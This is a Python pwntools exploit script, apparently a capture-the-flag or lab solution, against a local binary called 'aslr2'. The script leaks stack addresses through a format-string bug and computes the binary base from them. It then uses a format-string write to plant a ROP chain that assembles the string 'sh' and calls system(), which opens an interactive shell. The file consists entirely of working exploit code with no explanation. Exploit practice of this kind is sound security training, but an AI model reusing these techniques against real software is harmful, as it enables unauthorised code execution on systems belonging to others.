#!/bin/python

from pwn import *

context.clear(arch = 'amd64')
context.terminal = ['alacritty', '-e', 'sh', '-c']


e = ELF('./aslr2')

#io = gdb.debug('./aslr2', gdbscript = '''
#    b main
#    b read_square
#    c
#        ''')
io = process('./aslr2');



MAIN_RETURN_OFFSET = 337

#           offset to start of page | middle of page | additional offset to remove \n from payload
RW_OFFSET = 16384 +                   0x800 +          1

OR_OFFSET = 0x1471
POP_R13_R14_R15_OFFSET = 0x11c8

POP_RDI_OFFSET = 0x11cd


io.recvuntil(b'System address: ');
system_addr = int(io.recvline(), 16);

io.sendline(b"%520$llx %521$llx")
io.recvuntil(b'Wrong input');
io.recvline()
leak = io.recvline().decode('ASCII').split()

return_ptr = int(leak[1], 16)
base_ptr = int(leak[0], 16)

log.info("System address: " + hex(system_addr))
log.info("Return pointer: " + hex(return_ptr))
log.info("Base pointer: " + hex(base_ptr))

base_addr = return_ptr - e.symbols['main'] - MAIN_RETURN_OFFSET

log.info("Base address: " + hex(base_addr))



rop = b''

rop += p64(base_addr + POP_R13_R14_R15_OFFSET)
rop += p64(base_addr + RW_OFFSET + 0x4a)
rop += p64(ord('s'))
rop += p64(0xdeadbeefcafebabe)
rop += p64(base_addr + OR_OFFSET)

rop += p64(base_addr + POP_R13_R14_R15_OFFSET)
rop += p64(base_addr + RW_OFFSET + 0x4a + 1)
rop += p64(ord('h'))
rop += p64(0xdeadbeefcafebabe)
rop += p64(base_addr + OR_OFFSET)

rop += p64(base_addr + POP_RDI_OFFSET)
rop += p64(base_addr + RW_OFFSET)

rop += p64(system_addr)



payload = pwnlib.fmtstr.fmtstr_payload(6, { 
        (base_ptr - 0x1e): rop,
    }, write_size='short');

log.info("Payload: " + str(payload))
io.sendline(payload)


io.sendline(b'1')
io.interactive()
